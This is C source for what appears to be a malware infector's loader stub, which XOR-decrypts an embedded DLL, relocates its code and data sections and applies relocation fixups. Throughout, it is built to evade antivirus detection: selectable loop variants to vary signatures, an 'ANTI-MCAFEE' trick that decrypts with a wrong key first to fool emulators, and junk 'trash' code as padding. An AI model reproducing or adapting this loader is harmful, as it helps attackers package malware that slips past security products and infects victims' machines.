
//----- INFCODE C-PROCEDURE

// push    ebp
// mov     ebp, esp
//
// ...
//
// C9 leave  == mov    esp,ebp  
//           == pop    ebp
// C3 retn


//anti-av: select only 1 define

//#define CCDLL_P1
//#define CCDLL_P2
#define CCDLL_P3

//#define CCDLL_V1
//#define CCDLL_V2
#define CCDLL_V3

//#define CCXOR_V1
//#define CCXOR_V2
//#define CCXOR_V3
//#define CCXOR_V4
//#define CCXOR_V5
//#define CCXOR_V6
//#define CCXOR_V7
#define CCXOR_V8

//#define CCTCOPY_V1
//#define CCTCOPY_V2
#define CCTCOPY_V3

//#define CCDCOPY_V1
//#define CCDCOPY_V2
#define CCDCOPY_V3

#ifdef _MSC_VER
	#pragma optimize("", off)
#else
	#pragma optimize(off)
#endif


// Decrypt dll
// Move .text and .data section to use them
// Adjust function addresses and global vars with the relocation table
static void C_CODE_NG() 
{
	DWORD test;

	FIXUP_BLOCK *fb;
	DWORD o, dcount, dll_imagebase;

	DWORD dll_text_rva;
	DWORD dll_data_rva;
	unsigned char *b;
	
	unsigned char *dll_text, *new_dll_text;
	unsigned char *dll_data, *new_dll_data; 


	// 0x60 'pushad' will be first opcode
	//--- decrypt dll
#ifdef CCDLL_P1
	 unsigned char *dll;
	 DWORD xorkey;
	 DWORD dll_len;
#endif

#ifdef CCDLL_P2
	 unsigned char *dll=0;
	 DWORD xorkey; 
	 DWORD dll_len=0;
#endif

#ifdef CCDLL_P3
	 unsigned char *dll;
	 DWORD xorkey=0; 
	 DWORD dll_len;
#endif

	//////////////////////////////////////////////////////
	// Initialisation

#ifdef CCDLL_V1
	 dll=(LPSTR)0xFEFEFEFE; // dll, slagaemoe1
	 dll_len=0xF1F1F1F1;    // dll_len, slagaemoe1
	 dll+=0xFEFEFEFE;       // dll, slagaemoe2
	 dll_len+=0xF1F1F1F1;   // dll_len, slagaemoe2
	 xorkey=0xF0F0F0F0;     // xorkey
#endif

#ifdef CCDLL_V2
	 dll=(LPSTR)0xFEFEFEFE; // dll, slagaemoe1
	 dll+=0xFEFEFEFE;       // dll, slagaemoe2
	 xorkey=0xF0F0F0F0;     // xorkey
	 dll_len=0xF1F1F1F1;    // dll_len, slagaemoe1
	 dll_len+=0xF1F1F1F1;   // dll_len, slagaemoe2
#endif

#ifdef CCDLL_V3
	 xorkey=0xF0F0F0F0;		// xorkey
	 dll=(LPSTR)0xFEFEFEFE;	// 10E00
	 test = 0xFEFEFEFE;
	 dll+=test;
	 dll_len=0xF1F1F1F1;	// 10E00
	 test = 0xF1F1F1F1;
	 dll_len+=test;
#endif

	dcount=0; // ANTI-MCAFEE EMUL decrypt counter
	xorkey--; // for ANTI-MCAFEE EMUL: on 1st iteration decrypt with wrong key
	dexor:;

	//////////////////////////////////////////////////////
	// Decrypting

#ifdef CCXOR_V1
	 for (DWORD i=3;i<dll_len;i++) 
		 dll[i]^=(BYTE)xorkey; 
#endif

#ifdef CCXOR_V2
	 for (DWORD i=3;;i++) 
	 { 
		 if (i>=dll_len)
			 break; 
		 dll[i]^=(BYTE)xorkey; 
	 };
#endif

#ifdef CCXOR_V3
	 for (DWORD i=dll_len-1;i>2;i--)
		 dll[i]^=(BYTE)xorkey; 
#endif

#ifdef CCXOR_V4
	 for (DWORD i=dll_len-1;;i--) 
	 {
		 if (i<=3) 
			 break; 
		 dll[i]^=(BYTE)xorkey; 
	 };
#endif

#ifdef CCXOR_V5
	{ 
		DWORD i=3;
loop5:; 
		dll[i]^=(BYTE)xorkey; 
		i++;
		if (i<dll_len)
			goto loop5; 
	}
#endif

#ifdef CCXOR_V6
	{
		DWORD i=dll_len-1;
loop6:;
		dll[i]^=(BYTE)xorkey;
		i--;
		if (i>3)
			goto loop6;
	}
#endif

#ifdef CCXOR_V7
	 DWORD i=3;
loop7:;
	 dll[i]^=(BYTE)xorkey;
	 i++; 
	 if (i>=dll_len) 
		 goto done7;
	 goto loop7;
done7:;
#endif

#ifdef CCXOR_V8
	{
		DWORD i=3; 
loop8:; 
		if (i>=dll_len) 
			goto done8;
		dll[i]^=(BYTE)xorkey; 
		i++; 
		goto loop8;
done8:; }
#endif


	//////////////////////////////////////////////////////
	// Move .text

	dll_text	 = (LPSTR)0xFDFDFDFD;	// 419652
	new_dll_text = (LPSTR)0xFBFBFBFB;	// 42B000

	// from dcount==finished iteration number
	dcount++;   
	if (dcount==2)
	{
		// after 2nd interation - restore the correct xorkey
		xorkey++;  
	}

	if (dcount<3) 
	{
		// 2nd iteration - xor with wrong key again
	    // 3d  iteration - xor with correct key
		// 1st iteration - xor with wrong xorkey
		goto dexor;         
	}

#ifdef CCTCOPY_V1
	 for (DWORD q=0;q<0xFCFCFCFC;q++)
		 new_dll_text[q]=dll_text[q]; // 0xFCFCFCFC == dll_text_psize
#endif

#ifdef CCTCOPY_V2
	 for (DWORD q=0;;q++) 
	 { 
		 if (q>=0xFCFCFCFC)
			 break;
		 new_dll_text[q]=dll_text[q];
	 }; // 0xFCFCFCFC == dll_text_psize
#endif

#ifdef CCTCOPY_V3
	{
		DWORD q=0;
tloop3:; 
		new_dll_text[q]=dll_text[q];
		q++;
		if (q < 0xFCFCFCFC)	// dll_textPSZ, 7C00
			goto tloop3;
	}
#endif


	////////////////////////////////////////////////////////
	// Move .data

	dll_data =	   (LPSTR)0xFAFAFAFA;	// 426652
	new_dll_data = (LPSTR)0xF8F8F8F8;	// 439000

#ifdef CCDCOPY_V1
	 for (DWORD w=0;w<0xF9F9F9F9;w++)
		 new_dll_data[w]=dll_data[w]; // 0xF9F9F9F9 == dll_data_psize
#endif

#ifdef CCDCOPY_V2
	 for (DWORD w=0;;w++)
	 { 
		 if (w>=0xF9F9F9F9)
			 break;
		 new_dll_data[w]=dll_data[w];
	 }; // 0xF9F9F9F9 == dll_data_psize
#endif

#ifdef CCDCOPY_V3
	{
		DWORD w=0;
dloop3:;
		new_dll_data[w]=dll_data[w];
		w++; 
		if (w < 0xF9F9F9F9)	// dll_dataPSZ
			goto dloop3;
	}
#endif

	//---FIXUP sections
	dll_imagebase = 0xF5F5F5F5;		// 10000000
	fb = (LPVOID)0xF7F7F7F7;		// reloc_vadr, 427A52


nextfb:;
	dll_text_rva = 0xF3F3F3F3;	// 1000
	dll_data_rva = 0xF2F2F2F2;	// F000

	// --- Process TypeOffset Entries (each entry==1 WORD) inside FixupBlock
	for (o = 0; o < fb->BlockSize; o += 2)
	{
		wMEMORY *wmem;
		WORD TypeOffset;
		DWORD Type, Offset, delta;
		//DWORD dllVA;
		//DWORD exeVA;

		// new dll imagebase vadr 
		b = new_dll_text - dll_text_rva;
		wmem=(LPVOID)(o+8+(DWORD)fb);
		TypeOffset=wmem->word0;   

		if (TypeOffset == 0)
			break;

		// type of reloc
		Type   = TypeOffset >> 12;  
		Offset = TypeOffset << 20; 
		// offset since PageRVA
		Offset = Offset >> 20; 

		// fixupblock end
		if ((Offset == 0) && (o != 0))
			break;  

		// 32bit delta
		delta = (DWORD)b - dll_imagebase; 

		// old:
		//dllVA = dll_imagebase + fb->PageRVA + Offset;  // dll virt.addr
		//exeVA = (DWORD)b + fb->PageRVA + Offset;       // exe virt.addr
		//delta=exeVA-dllVA;  //32bit delta

		// +32bit delta
		if (Type == 3) 
		{
			//dMEMORY *dmem = (dMEMORY *)&b[fb->PageRVA + Offset];
			dMEMORY *dmem = (dMEMORY *)((DWORD)b + fb->PageRVA + Offset);
			dmem->dword0 += delta;
		}
	}

next:;
	fb = (LPVOID)(fb->BlockSize + (DWORD)fb);

	//reloc_vadr + dll_fixupsize
	if ((DWORD)fb < 0xF4F4F4F4)
		goto nextfb; 

	//--- TRASH (JUST MAKE SOME BUFFER)
	{
		DWORD x = (5000);
		DWORD y = (1096);
	 
		x *=  y + 3;  
		x += x + y + 8; 
		y += (164);
		y *= (23);    
	} 

}

#ifdef _MSC_VER
	#pragma optimize("", on)
#else
	#pragma optimize(on)
#endif
